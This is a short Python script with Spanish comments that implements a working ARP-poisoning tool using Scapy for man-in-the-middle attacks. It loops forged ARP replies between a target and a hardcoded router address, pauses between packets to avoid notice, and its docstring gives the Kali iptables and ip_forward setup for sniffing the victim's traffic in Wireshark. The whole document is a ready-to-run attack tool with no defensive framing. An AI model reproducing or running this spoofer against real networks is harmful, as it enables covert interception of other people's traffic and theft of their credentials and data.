#!/usr/bin/env python3

"""
Esto es un envenenador ARP escrito en Python utilizando Scapy. Util para hacer un ataque de MITM (Man In The Middle).

Es similar al arpspoofer habitual solo que la ip del router en este caso esta hardcodeada, el arpspoofer funciona asi:

arpspoof -i <nombre_interfaz> -t <ip_maquina_objetivo> -r <ip_router>

De esta manera nos pondremos en medio del trafico entre <ip_maquina_objetivo> y <ip_router> y podemos interceptar
utilizando Whireshark y escuchando en la interfaz correspondiente. Para esto tenemos que ejecutar primero en Kali estos comandos:


 $ iptables --policy FORWARD ACCEPT 

 # Esto es para que los paquetes que pasen por nosotros se reenvien al destino original y no interrumpamos la conexion a internet del 
 # atacado.


 # Ademas, el archivo en la ruta /proc/sys/net/ipv4/ip_forward debe tener el valor 1 (es posible que por defecto tenga el 0, cambiar haciendo sudo nano) 
"""
import argparse
import scapy.all as scapy
import time



def get_arguments():
	parser = argparse.ArgumentParser(description="ARP Spoofer.")

	parser.add_argument("-t", "--target", required=True, dest="ip_adress", help="Host or IP Range to poison/spoof.")


	return parser.parse_args()



def spoof(ip_adress, spoof_ip):
	# Voy a falsificar una respuesta ARP
	arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_adress, hwsrc="ab:bc:cd:44:55:66") 
	# Como lo que estamos tramitando es una respuesta, ponemos op 2 (Porque op 1 es una solicitud ARP)
	# psrc (protocol source)
	# hwsrc (hardware source)

	# Envio el paquete de respuesta ARP envenenado
	scapy.send(arp_packet, verbose=False)




def main():
	arguments = get_arguments()
	
	

	while True:
		spoof(arguments.ip_adress, "192.168.0.1")
		spoof("192.168.0.1", arguments.ip_adress) # Enviamos al router un paquete envenenado donde ponemos como origen la ip del ordenador objetivo
		"""
		Hacemos esto en bucle ya que sino, si el ordenador target enviara una respuesta ARP se reactualizarian los valores y perderiamos la conexion con su trafico
		"""

		# Como no queremos enviar millones de peticiones ARP sino camuflar un poco todo esto, con la libreria time separamos las peticiones entre si
		# por algunos segundos.

		time.sleep(3) # Establecemos 3 segundos de espera.



if __name__ == '__main__':
	main()
